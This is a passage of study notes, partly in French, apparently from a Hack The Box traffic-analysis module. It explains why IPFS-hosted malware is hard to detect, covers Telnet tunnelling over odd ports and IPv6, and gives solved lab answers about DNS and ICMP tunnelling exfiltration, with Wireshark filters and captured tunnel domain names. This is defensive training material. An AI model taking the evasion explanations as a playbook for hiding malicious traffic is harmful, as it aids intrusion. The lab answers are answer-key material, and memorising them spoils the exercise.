    - The root CID points to sub-chunks
    - IPFS fetches each chunk by its CID
    - It rebuilds the file from the structure

- **Example:**
    - file.txt >> is in IPFS system is like this after uploading >>
    - CID >> `QmS6eyoGjENZTMxM7UdqBk6Z3U3TZPAVeJXdgp9VK4o1Sz`
    - You can connect it like this:
    - `https://cloudflare-ipfs.com/ipfs/QmS6eyoGjENZTMxM7UdqBk6Z3U3TZPAVeJXdgp9VK4o1Sz`

- **Why IPFS's Peer-to-Peer Nature Is Hard to Detect (In Short):**
    ❌ No Central Server to Monitor:

    IPFS doesn’t use a fixed server (like malware.com).

    Files are requested by content (CID), not location (IP/domain).

    🧑‍🤝‍🧑 P2P Traffic Looks "Normal":

    Traffic goes to many random IP addresses (other peers).

    That makes it blend in with normal P2P or CDN-like behavior.

    🔐 Uses Standard Protocols (HTTP/S, DNS):

    IPFS gateways use HTTPS, making traffic encrypted and harder to inspect.

    Some malware even tunnels IPFS requests over DNS (e.g., using DNS tunneling), which can bypass firewalls.

    📦 CIDs Don’t Look Suspicious:

    A CID like QmS6eyoGjENZTM... doesn’t reveal what file it refers to.

    You can’t tell if it’s benign or malicious without resolving and analyzing it.

    🧲 Content Is Cached Across Nodes:

    Even if the original malicious node disappears, other nodes may still serve the file, making takedown and tracking difficult.

## Strange Telnet & UDP Connections
- **What is Telnet?:**
    - network protocol, 1970
    - used for remote command and control
    - tradition telnet protocol: port number: `23`
    - unencrypted >> plaintext

- **Unrecognized TCP Telnet in Wireshark:**
    - Hey, Telnet is just a communication protocol >> can be **easily switched to other PORT by an attacker**
    - Keep an eye on *Strange Port communications*
    - `Follow > TCP Streams` >> look at strange port numbered communications
    - Usually, Telnet >> used by `other TCP port numbers`

- **Telnet Protocol through IPv6:**
    - If you do not configure IPv6 >> then this communication is a sign of bad actions
    - `((ipv6.src_host == fe80::c9c8:ed3:1b10:f10b) or (ipv6.dst_host == fe80::c9c8:ed3:1b10:f10b)) and telnet`
    - `IPv6` >> can be used for **Telnet Tunneling:**

- **Common Uses of UDP:**
    1. `Real-Time Applications`
    2. `DNS`
    3. `DHCP`
    4. `SNMP` >> Simple Network Management Protocol >> uses UDP for network monitoring and management
    5. `TFTP` >> uses UDP for simple file transfers, commonly used by older Windows systems and others.

- **Practical Challenge:**
    1. Inspect the telnet_tunneling_ipv6.pcapng file, part of this module's resources, and enter the hidden flag as your answer.
       Answer format: HTB(___) (Replace all spaces with underscores)

       **Solved:**
       - J'ai utilise just cette commande dan mon terminal de Wireshark: `telnet`
       - Apres, J'ai vu que tout les packets sont avec des IPv6 addresses
       - Apres, J'ai fait >> `Follow > TCP Stream` >> Voila >> J'ai trouve le drapeau
       - C'est fini!

# Skills Assessment
1. Inspect the funky_dns.pcap file, part of this module's resources, and enter the related attack as your answer.

    **Solved:**
    - Here is something wrong with DNS domain names >> something weird appended to the domain names >> encoded or encrypted
        - laegpumiplhhpz12ynd1efljwlkjcgwy.pirate.sea: type NULL, class IN
        - zi05aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ.pirate.sea

    - Most likely, the attacker is performing >> DNS Tunelling >> exfiltrating data using dns
    - 10.0.2.30:44639 >> 10.0.2.20:53
    - Voila, c'est fini!

2. Inspect the funky_icmp.pcap file, part of this module's resources, and enter the related attack as your answer.

    **Solved:**
    - J'ai utilise deux commandes pour identifier ICMP requests et replies:
        - `icmp.type == 8` et `icmp.type == 0`
    - C'est bizzard que la taille normale pour ICMP request est environ 42 bytes ,
    - Mais certains packets a la taille: 1500 bytes, 1700 bytes,
    - Aussi, fragmented packets sont utilise, dont est super pas normal
    - Je pense que parfois, l'attaquant a envoye les petites commandes mais la victime a repondu
        avec de grandes reponses dont etait un signe de l'attaque
    - Le but principle de l'attaquant est de performer l'exfiltration des donnees de la victime
    - Voila >> Partie #2 10.13.37.145 >> l'attaquant, 192.168.178.34 >> la victime
    - C'est fini!












